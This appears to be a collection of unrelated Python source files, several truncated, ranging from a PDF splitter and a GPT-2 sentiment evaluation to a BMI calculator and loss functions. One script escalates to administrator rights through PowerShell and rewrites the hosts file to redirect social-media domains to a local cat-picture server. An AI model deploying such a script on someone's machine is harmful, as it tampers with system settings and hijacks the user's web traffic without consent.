    "import os\nfrom collections import deque\nfrom multiprocessing import Process\nfrom tkinter import Tk, ttk, filedialog, Text, END, StringVar, DISABLED, scrolledtext, messagebox\nfrom pathlib import Path\nfrom io import StringIO\nimport fitz  # PyMuPDF\nimport configparser\nimport pytesseract\nfrom PIL import Image\nimport re\nfrom PyPDF2 import PdfWriter, PdfReader\nimport threading\nfrom queue import Queue\n\n#Windows\nif os.name == 'nt':\n  if getattr(sys, 'frozen', False):\n      # If the application is run as a bundle, the PyInstaller bootloader\n      # extends the sys module by a flag frozen=True and sets the app \n      # path into variable _MEIPASS'.\n      application_path = sys._MEIPASS\n  else:\n      application_path = 'C:\\\\Program Files\\\\'\n  tesseract_cmd_path = os.path.join(application_path, 'Tesseract-OCR', 'tesseract.exe')\n  pytesseract.pytesseract.tesseract_cmd = tesseract_cmd_path\n\ndef center_window(width=300, height=200):\n    screen_width = root.winfo_screenwidth()\n    screen_height = root.winfo_screenheight()\n\n    x = (screen_width/2) - (width/2)\n    y = (screen_height/2) - (height/2)\n    root.geometry('%dx%d+%d+%d' % (width, height, x, y))\n\n# Create the main window\nroot = Tk()\nttk.Style().theme_use('clam')\nroot.title(\"PDF Splitter\")\ncenter_window(1000, 600)\n# root.minsize(width='1000', height='500')\n\n\n# Create the notebook (tabs)\nnotebook = ttk.Notebook(root)\nnotebook.pack(expand=True, fill=\"both\")\nnotebook.bind(\"<<NotebookTabChanged>>\", lambda _: root.update_idletasks())\n\ndef select_config_file():\n  filepath = filedialog.askopenfilename(\n      initialdir=str(Path.home()),\n      title=\"Select a configuration file\",\n      filetypes=[(\"Config files\", \".cfg\")]\n  )\n  if filepath:\n    config_file_entry.delete(0,END)\n    config_file_entry.insert(0,filepath)\n\ndef select_input_path():\n  filepath = filedialog.askdirectory(\n      initialdir=str(Path.home()),\n      title=\"Select a input directory\"\n  )\n  if filepath:\n    input_path_entry.delete(0,END)\n    input_path_entry.insert(0,filepath)\n\ndef select_output_path():\n  filepath = filedialog.askdirectory(\n      initialdir=str(Path.home()),\n      title=\"Select a output directory\"\n  )\n  if filepath:\n    output_path_entry.delete(0,END)\n    output_path_entry.insert(0,filepath)\n\n# Tab 1\ntab1 = ttk.Frame(notebook)\nnotebook.add(tab1, text=\"Split\")\n\ntab1.grid_columnconfigure(1, weight=1)\n\nconfig_file_label = ttk.Label(tab1, text=\"Configuration file\")\nconfig_file_label.grid(row = 1, column = 0, sticky = 'W', pady = 2)\n\nconfig_file_entry = ttk.Entry(tab1)\nconfig_file_entry.grid(row = 1, column = 1, sticky = 'EW', pady = 2)\n\nconfig_file_select = ttk.Button(tab1, text=\"Select File\", command=select_config_file)\nconfig_file_select.grid(row = 1, column = 2, padx=4, pady=2)\ndef open_create_config_tab():\n  notebook.select(tab2)\ncreate_config_file = ttk.Button(tab1, text=\"Create\", command=open_create_config_tab)\ncreate_config_file.grid(row = 1, column = 3, padx=4)\n\n\ninput_path_label = ttk.Label(tab1, text=\"Input Path\")\ninput_path_label.grid(row = 2, column = 0, sticky = 'W', pady = 2)\n\ninput_path_entry = ttk.Entry(tab1)\ninput_path_entry.grid(row = 2, column = 1, sticky = 'EW', pady = 2)\n\ninput_path_select = ttk.Button(tab1, text=\"Select\", command=select_input_path)\ninput_path_select.grid(row = 2, column = 2, padx = 2, pady=2)\n\n\noutput_path_label = ttk.Label(tab1, text=\"Output Path\")\noutput_path_label.grid(row = 3, column = 0, sticky = 'W', pady = 2)\n\noutput_path_entry = ttk.Entry(tab1)\noutput_path_entry.grid(row = 3, column = 1, sticky = 'EW', pady = 2)\n\noutput_path_select = ttk.Button(tab1, text=\"Select\", command=select_output_path)\noutput_path_select.grid(row = 3, column = 2, padx = 2, pady=2)\n\nprogress = scrolledtext.ScrolledText(tab1, state=DISABLED, bg='white', fg='black')\nprogress.grid(row=5, column=0, columnspan=4, sticky='ew', pady=20)\n\ndef clear_progress():\n  progress.configure(state='normal')\n  progress.delete(1.0, END)\n  progress.configure(state='disabled')\n\ndef append_progress_info(msg):\n  progress.configure(state='normal')\n  progress.insert(END, msg + '\\n')\n  progress.configure(state='disabled')\n  progress.update_idletasks()\n\ndef process_pdf(pdf_path, output_path, ocr_config):\n  pdf_reader = PdfReader(pdf_path)\n  pdf = fitz.open(pdf_path)\n\n  current_doc_type = None\n  current_writer = None\n  defendant_id = os.path.splitext(os.path.basename(pdf_path))[0]\n\n  # Create a subdirectory for the current PDF file\n  file_output_path = os.path.join(output_path, defendant_id)\n  if not os.path.exists(file_output_path):\n      os.makedirs(file_output_path)\n\n  for page_num in range(len(pdf)):\n      page = pdf[page_num]\n      page_found = False\n      pix = page.get_pixmap()\n\n      for doc_type, bbox in ocr_config.items():\n          # Extract sub-image using the bbox\n          adjusted_bbox = fitz.Rect(bbox)\n          sub_pix = page.get_pixmap(clip=adjusted_bbox)\n          sub_img = Image.frombytes(\"RGB\", [sub_pix.width, sub_pix.height], sub_pix.samples)\n\n          # Use pytesseract to do OCR on",
    "import torch\nfrom datasets import load_dataset\nfrom torch.utils.data import DataLoader\nfrom transformers import AutoModelForCausalLM, AutoTokenizer, pipeline\nimport numpy as np\nfrom tqdm import tqdm\nimport os\nimport argparse\nimport tree\n\n\ndef get_positive_score(scores):\n    \"Extract value associated with a positive sentiment from pipeline's output\"\n    return dict(map(lambda x: tuple(x.values()), scores))[\"POSITIVE\"]\n\n\n\n# create the top-level parser\nparser = argparse.ArgumentParser()\nparser.add_argument('--checkpoint', type=str, help='Path to the checkpoint')\n\nargs = parser.parse_args()\nparent_dir = os.path.dirname(args.checkpoint)\nroot_dit = ''\nstep_idxs = args.checkpoint.split('/')[-2]\nprint(f'Checkpoint: {args.checkpoint}')\n\nprint('Saving to:')\nprint(os.path.join(root_dit, f'{step_idxs}.txt'))\nprint('*' * 80  + '\\n')\npath = os.path.join(root_dit, f'{step_idxs}.txt')\nif not os.path.exists(path):\n    print(f\"The file does not exist. Continue running your process.\")\n    # Insert the code to run your process here\nelse:\n    print(f\"The file {path} exists. Exit the process.\")\n    exit() # Use sys.exit() if this doesn't work\n\n\ntorch.backends.cudnn.deterministic = True\ntorch.backends.cudnn.benchmark = False\n\ndef set_seed(seed=42):\n    np.random.seed(seed)\n    torch.manual_seed(seed)\n    # if args.n_gpu > 0:\n    torch.cuda.manual_seed_all(seed)\n\nset_seed(42)\n\n# Load your trained model\nstate_dict_path = args.checkpoint\n\n\ntokenizer = AutoTokenizer.from_pretrained('gpt2-large')\n# tokenizer.pad_token = tokenizer.eos_token\ntokenizer.padding_side=\"left\"\nif tokenizer.pad_token is None:\n    tokenizer.pad_token=tokenizer.eos_token\nmodel = AutoModelForCausalLM.from_pretrained('gpt2-large')\nmodel.load_state_dict(torch.load(state_dict_path, map_location=torch.device('cpu'))['state'])\n# import ipdb; ipdb.set_trace()\nmodel.to('cuda')\n\n# Load reference model\nref_model_name = ''  # this can be changed to another model if needed\nref_tokenizer = AutoTokenizer.from_pretrained(\"gpt2-large\")\n# ref_tokenizer.truncation_side = \"right\"\nref_tokenizer.padding_side=\"left\"\nif ref_tokenizer.pad_token is None:\n    ref_tokenizer.pad_token=tokenizer.eos_token\nref_model = AutoModelForCausalLM.from_pretrained(\"gpt2-large\")\n# ref_model.load_state_dict(torch.load(ref_model_name, map_location=torch.device('cpu'))['state'])\nref_model.to('cuda')\n# import ipdb; ipdb.set_trace()\n\nsentiment_fn = pipeline(\n    \"sentiment-analysis\",\n    \"siebert/sentiment-roberta-large-english\",\n    top_k=2,\n    truncation=True,\n    batch_size=64,\n    device=model.device  # specify the device id here\n)\n# Load the imdb dataset\nimdb_test = load_dataset(\"imdb\", split=\"test\")\n\n# Preprocess the dataset\neval_prompts = [\" \".join(review.split()[:4]) for review in imdb_test[\"text\"]]\ninputs = tokenizer(eval_prompts, return_tensors='pt', truncation=True, padding=True)\n\n# Prepare for batching\ndataset = torch.utils.data.TensorDataset(inputs['input_ids'], inputs['attention_mask'], )\nprint(len(dataset))\ndata_loader = DataLoader(dataset, batch_size=64)\n\n\ntotal_num_items = 0\ntotal_reward = 0\n\nwith torch.no_grad():\n    for batch_input_ids, batch_attention_mask in tqdm(data_loader):\n        # Generate samples from the pretrained model\n        # import ipdb; ipdb.set_trace()\n        batch_input_ids = batch_input_ids.cuda()\n        batch_attention_mask = batch_attention_mask.cuda()\n        # with torch.no_grad():\n        generated_ids = model.generate(batch_input_ids, attention_mask=batch_attention_mask, do_sample=True, max_new_tokens=60, pad_token_id=tokenizer.pad_token_id)\n        \n        # Get log probabilities for the generated samples\n        \n        # with torch.no_grad():\n        if True:\n            model_inputs = tokenizer(tokenizer.batch_decode(generated_ids), return_tensors='pt', padding=True)\n            model_inputs = tree.map_structure(lambda x: x.to(model.device), model_inputs)\n            model_outputs = model(**model_inputs, labels=model_inputs['input_ids'])\n            model_log_probs = model_outputs.logits.softmax(dim=-1).log()\n\n            ref_inputs = ref_tokenizer(tokenizer.batch_decode(generated_ids), return_tensors='pt', padding=True)\n            ref_inputs = tree.map_structure(lambda x: x.to(ref_model.device), ref_inputs)\n            ref_outputs = ref_model(**ref_inputs, labels=ref_inputs['input_ids'])\n            ref_log_probs = ref_outputs.logits.softmax(dim=-1).log()\n        \n        generated_ids = model_inputs['input_ids']\n        attention_mask = (generated_ids != tokenizer.eos_token_id).float()\n\n        generated_texts = tokenizer.batch_decode(generated_ids, skip_special_tokens=True)\n\n        sentiments = sentiment_fn(generated_texts)\n        sentiment_scores = [get_positive_score(sentiment) for sentiment in sentiments]\n        # sentiment_scores = [sentiment_fn(text)[0][0]['score'] for text in generated_texts]\n        total_reward += sum(sentiment_scores)\n        \n\n        total_num_items += len(batch_input_ids)\n\n# Compute averages\naverage_reward = total_rewa",
    "def keyPressed(c):\n\tif c.key == 65:\n\t\t# F7 \u6539\u53d8\u4e3a\u7075\u9b42\u51fa\u7a8d\u72b6\u6001\n\t\tplayerName = c.player.getDisplayName()\n\t\tcurGamemode = c.player.getGamemode()\n\t\tif curGamemode != 3:\n\t\t\tc.player.getStoreddata().put(playerName+\"originalGamemode\", curGamemode)\n\t\t\tpos = c.player.getPos()\n\t\t\tx = pos.getX()\n\t\t\ty = pos.getY()\n\t\t\tz = pos.getZ()\n\t\t\tstandEntity = c.API.getClones().spawn(x, y, z, 1, \"PlayerNpc\", c.player.getWorld())\n\t\t\tc.player.getStoreddata().put(playerName+\"standEntity\", standEntity.getUUID())\n\t\t\tc.player.getStoreddata().put(playerName+\"originalX\", x)\n\t\t\tc.player.getStoreddata().put(playerName+\"originalY\", y)\n\t\t\tc.player.getStoreddata().put(playerName+\"originalZ\", z)\n\t\t\tstandEntity.getDisplay().setName(c.player.getName())\n\t\t\tstandEntity.updateClient()\n\t\t\tstandEntity.getDisplay().setSkinPlayer(c.player.getName())\n\t\t\tc.player.setGamemode(3)\n\t\telse:\n\t\t\tx = float(c.player.getStoreddata().get(playerName+\"originalX\"))\n\t\t\ty = float(c.player.getStoreddata().get(playerName+\"originalY\"))\n\t\t\tz = float(c.player.getStoreddata().get(playerName+\"originalZ\"))\n\t\t\tc.player.setPosition(x, y, z)\n\t\t\tc.player.setGamemode(int(c.player.getStoreddata().get(playerName+\"originalGamemode\")))\n\t\t\tstandEntity = c.player.getWorld().getEntity(c.player.getStoreddata().get(playerName+\"standEntity\"))\n\t\t\tstandEntity.kill()\n\t\t\tc.player.getStoreddata().remove(playerName+\"originalX\")\n\t\t\tc.player.getStoreddata().remove(playerName+\"originalY\")\n\t\t\tc.player.getStoreddata().remove(playerName+\"originalZ\")\n\t\t\tc.player.getStoreddata().remove(playerName+\"originalGamemode\")\n",
    "import importlib\nimport os\n\nNODE_CLASS_MAPPINGS = {}\nNODE_DISPLAY_NAME_MAPPINGS = {}\n\n# Main nodes for all users\nNODE_MODULES = [\n  \".nodes\"\n]\n\ndef load_nodes(module_name: str):\n    global NODE_CLASS_MAPPINGS, NODE_DISPLAY_NAME_MAPPINGS\n\n    module = importlib.import_module(module_name, package=__name__)\n\n    NODE_CLASS_MAPPINGS = {\n        **NODE_CLASS_MAPPINGS,\n        **module.NODE_CLASS_MAPPINGS,\n    }\n    NODE_DISPLAY_NAME_MAPPINGS = {\n        **NODE_DISPLAY_NAME_MAPPINGS,\n        **module.NODE_DISPLAY_NAME_MAPPINGS,\n    }\n\ndef write_nodes_list(module_names: list[str]):\n    this_dir = os.path.dirname(os.path.abspath(__file__))\n    path = os.path.join(this_dir, \"nodes.log\")\n\n    lines = []\n\n    for module_name in module_names:\n        module = importlib.import_module(module_name, package=__name__)\n\n        lines.append(module_name.strip(\".\"))\n\n        for identifier, display_name in module.NODE_DISPLAY_NAME_MAPPINGS.items():\n            lines.append(f\"  {identifier}: {display_name}\")\n\n        lines.append(\"\")\n\n    lines = \"\\n\".join(lines)\n\n    with open(path, \"w\", encoding=\"utf8\") as f:\n        f.write(lines)\n\n\nfor module_name in NODE_MODULES:\n    load_nodes(module_name)\n",
    "from tkinter import *\r\nfrom tkinter import messagebox\r\n\r\n\r\ndef reset():\r\n    height.delete(0, 'end')\r\n    weight.delete(0, 'end')\r\n\r\n\r\ndef bmi_cal():\r\n    kg = int(weight.get())\r\n    m = int(height.get()) / 100\r\n    bmi = kg / m ** 2\r\n    bmi = round(bmi, 1)\r\n    bmi_index_over18(bmi)\r\n\r\n\r\ndef bmi_index_over18(bmi):\r\n    if bmi < 18.5:\r\n        messagebox.showinfo('BMI', f'BMI = {bmi} is Underweight')\r\n    elif (bmi > 18.5) and (bmi < 24.9):\r\n        messagebox.showinfo('BMI', f'BMI = {bmi} is Normal')\r\n    elif (bmi > 24.9) and (bmi < 29.9):\r\n        messagebox.showinfo('BMI', f'BMI = {bmi} is Overweight')\r\n    elif bmi > 29.9:\r\n        messagebox.showinfo('BMI', f'BMI = {bmi} is Obesity')\r\n    else:\r\n        messagebox.showerror('BMI', 'something went wrong!')\r\n\r\ndef info():\r\n    messagebox.showinfo('Info', 'v1, you can calculate your bmi.')\r\n\r\nroot = Tk()\r\nroot.title(\"\u0637\u0631\u0627\u062d\u06cc \u0634\u062f\u0647 \u062a\u0648\u0633\u0637 \u0637\u0627\u0647\u0627 \u062f\u0698\u0628\u0627\u0646\u06cc\")\r\n\r\nvar = IntVar()\r\n\r\nframe = Frame(root, padx=10, pady=10)\r\nframe.pack(expand=True)\r\n\r\nage = Label(frame, text=\"\u0637\u0631\u0627\u062d\u06cc \u0634\u062f\u0647 \u062a\u0648\u0633\u0637 \u0637\u0627\u0647\u0627 \u062f\u0698\u0628\u0627\u0646\u06cc\", fg='blue')\r\nage.grid(row=2, column=1)\r\n\r\nframe2 = Frame(frame)\r\nframe2.grid(row=2, column=2, pady=10)\r\n\r\n\r\nheight_label = Label(frame, text=\"\u0644\u0637\u0641\u0627 \u0642\u062f \u062a\u0627\u0646 \u0631\u0627 \u0648\u0627\u0631\u062f \u06a9\u0646\u06cc\u062f:\")\r\nheight_label.grid(row=3, column=1)\r\nweight_label = Label(frame, text=\"\u0644\u0637\u0641\u0627 \u0648\u0632\u0646 \u062a\u0627\u0646 \u0631\u0627 \u0648\u0627\u0631\u062f \u06a9\u0646\u06cc\u062f:\")\r\nweight_label.grid(row=4, column=1)\r\n\r\nheight = Entry(frame)\r\nheight.grid(row=3, column=2, pady=5)\r\nweight = Entry(frame)\r\nweight.grid(row=4, column=2, pady=5)\r\n\r\nframe3 = Frame(frame)\r\nframe3.grid(row=5, column=3, pady=10)\r\n\r\ncalculate_b = Button(frame3, text=\"\u0645\u062d\u0627\u0633\u0628\u0647 \u06a9\u0631\u062f\u0646\", command=bmi_cal)\r\ncalculate_b.pack(side=LEFT)\r\n\r\nreset_b = Button(frame3, text=\"\u067e\u0627\u06a9\u0633\u0627\u0632\u06cc\", command=reset)\r\nreset_b.pack(side=RIGHT)\r\n\r\ninfo_b = Button(frame3, text=\"\u0627\u0637\u0644\u0627\u0639\u0627\u062a\", command=info)\r\ninfo_b.pack(side=RIGHT)\r\n\r\nroot.mainloop()",
    "import torch\nimport os\nfrom torch import nn\nimport numpy as np\nimport torch.nn.functional\nfrom collections import OrderedDict\nfrom termcolor import colored\nimport sys\nimport yaml\nfrom lib.config import cfg\n\n\ndef sigmoid(x):\n    y = torch.clamp(x.sigmoid(), min=1e-4, max=1 - 1e-4)\n    return y\n\n\ndef _neg_loss(pred, gt):\n    ''' Modified focal loss. Exactly the same as CornerNet.\n        Runs faster and costs a little bit more memory\n        Arguments:\n            pred (batch x c x h x w)\n            gt_regr (batch x c x h x w)\n    '''\n    pos_inds = gt.eq(1).float()\n    neg_inds = gt.lt(1).float()\n\n    neg_weights = torch.pow(1 - gt, 4)\n\n    loss = 0\n\n    pos_loss = torch.log(pred) * torch.pow(1 - pred, 2) * pos_inds\n    neg_loss = torch.log(1 - pred) * torch.pow(pred,\n                                               2) * neg_weights * neg_inds\n\n    num_pos = pos_inds.float().sum()\n    pos_loss = pos_loss.sum()\n    neg_loss = neg_loss.sum()\n\n    if num_pos == 0:\n        loss = loss - neg_loss\n    else:\n        loss = loss - (pos_loss + neg_loss) / num_pos\n    return loss\n\n\nclass FocalLoss(nn.Module):\n    '''nn.Module warpper for focal loss'''\n    def __init__(self):\n        super(FocalLoss, self).__init__()\n        self.neg_loss = _neg_loss\n\n    def forward(self, out, target):\n        return self.neg_loss(out, target)\n\n\ndef smooth_l1_loss(vertex_pred,\n                   vertex_targets,\n                   vertex_weights,\n                   sigma=1.0,\n                   normalize=True,\n                   reduce=True):\n    \"\"\"\n    :param vertex_pred:     [b, vn*2, h, w]\n    :param vertex_targets:  [b, vn*2, h, w]\n    :param vertex_weights:  [b, 1, h, w]\n    :param sigma:\n    :param normalize:\n    :param reduce:\n    :return:\n    \"\"\"\n    b, ver_dim, _, _ = vertex_pred.shape\n    sigma_2 = sigma**2\n    vertex_diff = vertex_pred - vertex_targets\n    diff = vertex_weights * vertex_diff\n    abs_diff = torch.abs(diff)\n    smoothL1_sign = (abs_diff < 1. / sigma_2).detach().float()\n    in_loss = torch.pow(diff, 2) * (sigma_2 / 2.) * smoothL1_sign \\\n              + (abs_diff - (0.5 / sigma_2)) * (1. - smoothL1_sign)\n\n    if normalize:\n        in_loss = torch.sum(in_loss.view(b, -1), 1) / (\n            ver_dim * torch.sum(vertex_weights.view(b, -1), 1) + 1e-3)\n\n    if reduce:\n        in_loss = torch.mean(in_loss)\n\n    return in_loss\n\n\nclass SmoothL1Loss(nn.Module):\n    def __init__(self):\n        super(SmoothL1Loss, self).__init__()\n        self.smooth_l1_loss = smooth_l1_loss\n\n    def forward(self,\n                preds,\n                targets,\n                weights,\n                sigma=1.0,\n                normalize=True,\n                reduce=True):\n        return self.smooth_l1_loss(preds, targets, weights, sigma, normalize,\n                                   reduce)\n\n\nclass AELoss(nn.Module):\n    def __init__(self):\n        super(AELoss, self).__init__()\n\n    def forward(self, ae, ind, ind_mask):\n        \"\"\"\n        ae: [b, 1, h, w]\n        ind: [b, max_objs, max_parts]\n        ind_mask: [b, max_objs, max_parts]\n        obj_mask: [b, max_objs]\n        \"\"\"\n        # first index\n        b, _, h, w = ae.shape\n        b, max_objs, max_parts = ind.shape\n        obj_mask = torch.sum(ind_mask, dim=2) != 0\n\n        ae = ae.view(b, h * w, 1)\n        seed_ind = ind.view(b, max_objs * max_parts, 1)\n        tag = ae.gather(1, seed_ind).view(b, max_objs, max_parts)\n\n        # compute the mean\n        tag_mean = tag * ind_mask\n        tag_mean = tag_mean.sum(2) / (ind_mask.sum(2) + 1e-4)\n\n        # pull ae of the same object to their mean\n        pull_dist = (tag - tag_mean.unsqueeze(2)).pow(2) * ind_mask\n        obj_num = obj_mask.sum(dim=1).float()\n        pull = (pull_dist.sum(dim=(1, 2)) / (obj_num + 1e-4)).sum()\n        pull /= b\n\n        # push away the mean of different objects\n        push_dist = torch.abs(tag_mean.unsqueeze(1) - tag_mean.unsqueeze(2))\n        push_dist = 1 - push_dist\n        push_dist = nn.functional.relu(push_dist, inplace=True)\n        obj_mask = (obj_mask.unsqueeze(1) + obj_mask.unsqueeze(2)) == 2\n        push_dist = push_dist * obj_mask.float()\n        push = ((push_dist.sum(dim=(1, 2)) - obj_num) /\n                (obj_num * (obj_num - 1) + 1e-4)).sum()\n        push /= b\n        return pull, push\n\n\nclass PolyMatchingLoss(nn.Module):\n    def __init__(self, pnum):\n        super(PolyMatchingLoss, self).__init__()\n\n        self.pnum = pnum\n        batch_size = 1\n        pidxall = np.zeros(shape=(batch_size, pnum, pnum), dtype=np.int32)\n        for b in range(batch_size):\n            for i in range(pnum):\n                pidx = (np.arange(pnum) + i) % pnum\n                pidxall[b, i] = pidx\n\n        device = torch.device('cuda')\n        pidxall = torch.from_numpy(\n            np.reshape(pidxall, newshape=(batch_size, -1))).to(device)\n\n        self.feature_id = pidxall.unsqueeze_(2).long().expand(\n            pidxall.size(0), pidxall.size(1), 2).detach()\n\n    def forward(self, pred, gt, loss_type=\"L2",
    "import subprocess, http.server, socketserver, os, sys\r\n\r\n#Noting current public IP Address--------------------------\r\nip_method_check = str(os.system(command = 'curl ifcfg.me'))\r\n\r\nif ip_method_check != '6':\r\n    ipv4 = str(subprocess.check_output('curl ifcfg.me'))\r\nelse:\r\n    ipv4 = str(subprocess.check_output('curl icanhazip.com'))\r\n#-------------------------------------------------------------\r\n\r\n\r\n#take a seperate list of social media companies, and turn each name/line into an item\r\ncompanies = open('firmen.txt', 'r').read().split('\\n') \r\ncreate_temp_hostnames = open('hostnames.txt', 'a')\r\n\r\n\r\n#go through each company name and create new versions of it that will fit into the hosts file\r\n#these new names are added to a created, temperoary hostnames file\r\nfor company in companies:\r\n    addlist_pre = ['www.', '']\r\n    addlist_post = ['.com', '.net', '.org', '.gg', '.net']\r\n    for PieceOfDomain in addlist_pre:\r\n        hostname_part1 = PieceOfDomain + company\r\n        for PieceOfDomain in addlist_post:\r\n            hostname_final =  hostname_part1 + PieceOfDomain\r\n            create_temp_hostnames.write('\\n' + str(hostname_final))\r\n\r\ncreate_temp_hostnames.close()\r\n\r\n\r\n#execution of powershell instance, which uses powershell_command script to create another powershell instance w/ elevated privs.\r\n#The elevated script goes through each line within the hostnames.txt file within the same directory as this index.py file.\r\n#The refrenced script, KatzeHerstellerin.ps1 (Roughly translated to Cat Manufacturer) is the script that actually applies the changes to the hosts file.\r\npowershell_command = r\"\"\"Start-Process -Verb runAs -Wait powershell.exe -Args \"cd \"\"\" + str(os.getcwd()) + r\"\"\" ; ./KatzeHerstellerin.ps1 -Force\" \"\"\"\r\np = subprocess.Popen([\"powershell.exe\", powershell_command], stdout=sys.stdout)\r\n\r\n\r\n#establish general variables like port number and the picture of the cat that needs to be displayed\r\nPORT = 80\r\nDEFAULT_FILE = \"katze.png\"\r\n\r\n\r\n#create simple http server that displays image of a cat as its only static content\r\n#the changes in the hosts file is inteded to direct as much trafic as possible to this local server\r\nclass CustomHandler(http.server.SimpleHTTPRequestHandler):\r\n    def do_GET(self):\r\n        self.path = DEFAULT_FILE\r\n        return http.server.SimpleHTTPRequestHandler.do_GET(self)\r\n\r\n\r\n#signify data collection and editing is finished\r\nprint('done')\r\n\r\n\r\n#leave the webserver running\r\nwith socketserver.TCPServer((\"\", PORT), CustomHandler) as httpd:\r\n    httpd.serve_forever()",
    "import os\nfrom io import BytesIO\nfrom urllib.parse import urlparse\nfrom urllib3 import PoolManager\nimport imghdr\nfrom .exceptions import FileTooLargeError, InvalidImageExtensionError\n\n\nclass Validator:\n    \"\"\"\n        Standard Validator for reSmushit\n    \"\"\"\n    def __init__(self, path, max_file_size):\n        self.path = path\n        self.type = None\n        self.max_file_size = max_file_size\n        self.max_file_size_kb = max_file_size // 1024\n        self.__ALLOWED_FILETYPES = (\"png\", \"jpg\", \"jpeg\", \"gif\", \"bmp\", \"tiff\", \"tiff\")\n\n    def __check_path_type(self):\n        parsed_url = urlparse(self.path)\n\n        if all([parsed_url.scheme, parsed_url.netloc, parsed_url.path]):\n            self.type = \"url\"\n            return \"url\"\n\n        if os.path.isfile(self.path) and os.path.exists(self.path):\n            self.type = \"file\"\n            return \"file\"\n        else:\n            raise FileNotFoundError(f\"File {self.path} does not exist.\")\n\n    def __check_url_validity(self):\n        if urlparse(self.path).scheme in [\"http\", \"https\", \"ftp\"]:\n            return True\n        else:\n            raise ValueError(f\"URL scheme required: {self.path}\")\n\n    def __file_exists(self):\n        if os.path.exists(self.path):\n            return True\n        raise FileNotFoundError(f\"{self.path}\")\n\n    def __open_image_from_url(self):\n        http = PoolManager()\n        r = http.request(\"GET\", url=self.path)\n        return r.data\n\n    def __open_image_from_path(self):\n        data = \"\"\n        with open(self.path, \"rb\") as f:\n            data = f.read()\n        return data\n\n    def __find_image_extension(self, imagebytes):\n        return imghdr.what(None, h=imagebytes)\n\n    def __check_file_size(self, imagebytes):\n\n        if len(imagebytes) > self.max_file_size:\n            raise FileTooLargeError(\n                f\"Max allowed file size: {self.max_file_size_kb}KB.\"\n            )\n\n    def __get_file_name(self):\n        filename, _ = os.path.splitext(os.path.basename(urlparse(self.path).path))\n        return filename\n\n    def __get_file_extension(self):\n        _, extension = os.path.splitext(os.path.basename(urlparse(self.path).path))\n        if extension == \".jpeg\":\n            extension = \".jpg\"\n        return extension\n\n    def __check_allowed_filetypes(self, imagebytes):\n        extension = self.__find_image_extension(imagebytes=imagebytes)\n        if not extension in self.__ALLOWED_FILETYPES:\n            raise InvalidImageExtensionError(\n                f\"'{extension}' extension type is not allowed.\\nAllowed types: {self.__ALLOWED_FILETYPES}\"\n            )\n\n    def validate(self):\n        _type = self.__check_path_type()\n\n        if _type == \"url\":\n            self.__check_url_validity()\n            imagebytes = self.__open_image_from_url()\n            self.__check_allowed_filetypes(imagebytes=imagebytes)\n            self.__check_file_size(imagebytes=imagebytes)\n            filename = self.__get_file_name()\n            fileext = self.__get_file_extension()\n\n            return self.path, _type, imagebytes, filename, fileext\n\n        if _type == \"file\":\n            self.__file_exists()\n            imagebytes = self.__open_image_from_path()\n            self.__check_allowed_filetypes(imagebytes=imagebytes)\n            filename = self.__get_file_name()\n            fileext = self.__get_file_extension()\n            self.__check_file_size(imagebytes=imagebytes)\n            return self.path, _type, imagebytes, filename, fileext\n",
    "## MODULES\r\nimport os\r\nimport cv2\r\nimport tensorflow as tf\r\nimport numpy as np\r\n\r\ndef load_validation_data(path):\r\n\tvalid_images = []\r\n\tvalid_labels = []\r\n\tvalid_boxes = []\r\n\r\n\twith open(path + \"/valid/data.csv\", 'r') as data_file:\r\n\t\tdata_file.readline()        # Pass header line\r\n\t\tfor line in data_file:\r\n\t\t\tline = line.strip().split(',')\r\n\t\t\timage_path = line[0]\r\n\t\t\tvalid_images.append(cv2.imread(path + \"/valid/\" + image_path))\r\n\t\t\tvalid_labels.append([int(line[3])])\r\n\t\t\tvalid_boxes.append([float(line[4]), float(line[5]), float(line[6]), float(line[7])])\r\n\r\n\treturn np.array(valid_images), np.array(valid_labels), np.array(valid_boxes)\r\n\r\ndef process_dataset(images, labels, boxes, width, height):\r\n\t## Normalize pixel values to be between 0 and 1\r\n\timages = images / 255.0\r\n\r\n\t## Normalize boxes position to be between 0 and 1 for height and width\r\n\tboxes[:,0], boxes[:,2] = boxes[:,0]/width, boxes[:,2]/width\r\n\tboxes[:,1], boxes[:,3] = boxes[:,1]/height, boxes[:,3]/height\r\n\r\n\t## Shuffling all the data\r\n\tseed = 1000\r\n\timages = tf.random.shuffle(images, seed=seed)\r\n\tlabels = tf.random.shuffle(labels, seed=seed)\r\n\tboxes = tf.random.shuffle(boxes, seed=seed)\r\n\r\n\t## Create validations sets\r\n\tverif = (labels, boxes)\r\n\r\n\treturn images, verif\r\n\r\ndef load_model(model_name = \"RCNN_DS_BS64_Fmax_E50_N64_NL2\", path = \"E:/Documents/Cours/SeaTech/2A/Git/App\"):\r\n\ttry:\r\n\t\tmodel = tf.keras.models.load_model(path + '/' + model_name + \".keras\")\r\n\texcept ValueError:\r\n\t\treturn -1\r\n\treturn model\r\n\r\ndef evaluate_model(model, width = 256.0, height = 144.0, path = \"E:/Documents/Cours/SeaTech/2A/Projet/fishDataset2\"):\r\n\t## Loading validation data\r\n\tvalid_images, valid_labels, valid_boxes = load_validation_data(path)\r\n\r\n\t## Validation set informations\r\n\tnb_images = len(valid_images)\r\n\r\n\t## Processing validation data\r\n\tvalid_images, valid_true = process_dataset(valid_images, valid_labels, valid_boxes, width, height)\r\n\r\n\t## Evaluate model performances\r\n\thistory = model.evaluate(valid_images, valid_true, verbose=0)\r\n\r\n\treturn history, nb_images\r\n\r\ndef resize_images(images, width, height):\r\n\timgs = []\r\n\tfor image in images:\r\n\t\tif np.shape(image) != (height, width, 3):\r\n\t\t\timg = cv2.resize(image, (width, height))\r\n\t\telse:\r\n\t\t\timg = image\r\n\t\timgs.append(img)\r\n\treturn imgs\r\n\r\n\r\n\r\ndef process_video_c(model, video_path, width, height, output_dir):\r\n\r\n\tmodel_class = tf.keras.models.load_model(\"E:/Documents/Cours/SeaTech/2A/Git/App/RCNN_class.keras\")\r\n\tmodel_reg = tf.keras.models.load_model(\"E:/Documents/Cours/SeaTech/2A/Git/App/RCNN_reg.keras\")\r\n\r\n\tcap = cv2.VideoCapture(video_path)\r\n\r\n\tcpt = 0\r\n\twhile cap.isOpened():\r\n\t\t_, frame = cap.read()\r\n\r\n\t\tif len(np.shape(frame)) != 3:\r\n\t\t\tbreak\r\n\r\n\t\timg_height, img_width, _ = np.shape(frame)\r\n\t\timg_to_process = resize_images([frame], width, height)\r\n\r\n\t\tlabel, box = process_images(model_class, model_reg, np.array(img_to_process), width, height)\r\n\r\n\t\tif label:\r\n\t\t\tcpt += 1\r\n\t\t\tcolor = (255, 0, 0)\r\n\t\t\tbox = box[0]\r\n\t\t\trect_frame = 